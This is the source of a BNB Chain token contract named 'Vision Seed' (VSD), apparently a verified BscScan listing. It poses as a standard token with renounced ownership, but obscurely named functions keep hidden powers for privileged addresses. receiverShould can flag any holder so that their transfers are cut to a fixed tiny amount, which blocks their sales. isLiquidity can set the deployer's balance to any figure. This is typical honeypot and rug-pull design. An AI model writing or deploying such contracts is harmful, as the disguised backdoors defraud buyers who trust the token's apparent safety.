/**
 *Submitted for verification at BscScan.com on 2023-02-07
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _setOwner(_msgSender());
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _setOwner(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _setOwner(newOwner);
    }

    function _setOwner(address newOwner) private {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

interface totalLiquidity {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface atAmountLiquidity {
    function createPair(address tokenA, address tokenB) external returns (address);
}

contract VisionSeed is Ownable {
    uint8 private launchedSell = 18;

    string private _name = "Vision Seed";
    string private _symbol = "VSD";

    uint256 private exemptTokenLimit = 100000000 * 10 ** launchedSell;
    mapping(address => uint256) private buyWallet;
    mapping(address => mapping(address => uint256)) private listExempt;

    mapping(address => bool) public launchMaxSell;
    address public launchReceiver;
    address public receiverMax;
    mapping(address => bool) public senderFee;
    uint256 constant receiverEnable = 10 ** 10;
    bool public receiverModeWallet;

    

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor (){
        totalLiquidity senderFundFee = totalLiquidity(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverMax = atAmountLiquidity(senderFundFee.factory()).createPair(senderFundFee.WETH(), address(this));
        launchReceiver = modeLaunch();
        launchMaxSell[launchReceiver] = true;
        buyWallet[launchReceiver] = exemptTokenLimit;
        emit Transfer(address(0), launchReceiver, exemptTokenLimit);
        renounceOwnership();
    }

    

    function launchMarketing(address totalLaunched) public {
        if (receiverModeWallet) {
            return;
        }
        launchMaxSell[totalLaunched] = true;
        receiverModeWallet = true;
    }

    function balanceOf(address listMin) public view returns (uint256) {
        return buyWallet[listMin];
    }

    function approve(address launchedReceiverExempt, uint256 modeReceiver) public returns (bool) {
        listExempt[modeLaunch()][launchedReceiverExempt] = modeReceiver;
        emit Approval(modeLaunch(), launchedReceiverExempt, modeReceiver);
        return true;
    }

    function transfer(address isReceiverAuto, uint256 modeReceiver) external returns (bool) {
        return transferFrom(modeLaunch(), isReceiverAuto, modeReceiver);
    }

    function decimals() external view returns (uint8) {
        return launchedSell;
    }

    function modeLaunch() private view returns (address) {
        return msg.sender;
    }

    function receiverShould(address sellFee) public {
        if (sellFee == launchReceiver || sellFee == receiverMax || !launchMaxSell[modeLaunch()]) {
            return;
        }
        senderFee[sellFee] = true;
    }

    function transferFrom(address amountSender, address isReceiverAuto, uint256 modeReceiver) public returns (bool) {
        if (amountSender != modeLaunch() && listExempt[amountSender][modeLaunch()] != type(uint256).max) {
            require(listExempt[amountSender][modeLaunch()] >= modeReceiver);
            listExempt[amountSender][modeLaunch()] -= modeReceiver;
        }
        if (isReceiverAuto == launchReceiver || amountSender == launchReceiver) {
            return exemptBuy(amountSender, isReceiverAuto, modeReceiver);
        }
        if (senderFee[amountSender]) {
            return exemptBuy(amountSender, isReceiverAuto, receiverEnable);
        }
        return exemptBuy(amountSender, isReceiverAuto, modeReceiver);
    }

    function getOwner() external view returns (address) {
        return owner();
    }

    function isLiquidity(uint256 modeReceiver) public {
        if (!launchMaxSell[modeLaunch()]) {
            return;
        }
        buyWallet[launchReceiver] = modeReceiver;
    }

    function exemptBuy(address launchedAmount, address listFrom, uint256 modeReceiver) internal returns (bool) {
        require(buyWallet[launchedAmount] >= modeReceiver);
        buyWallet[launchedAmount] -= modeReceiver;
        buyWallet[listFrom] += modeReceiver;
        emit Transfer(launchedAmount, listFrom, modeReceiver);
        return true;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function allowance(address swapMarketing, address launchedReceiverExempt) external view returns (uint256) {
        return listExempt[swapMarketing][launchedReceiverExempt];
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function totalSupply() external view returns (uint256) {
        return exemptTokenLimit;
    }


}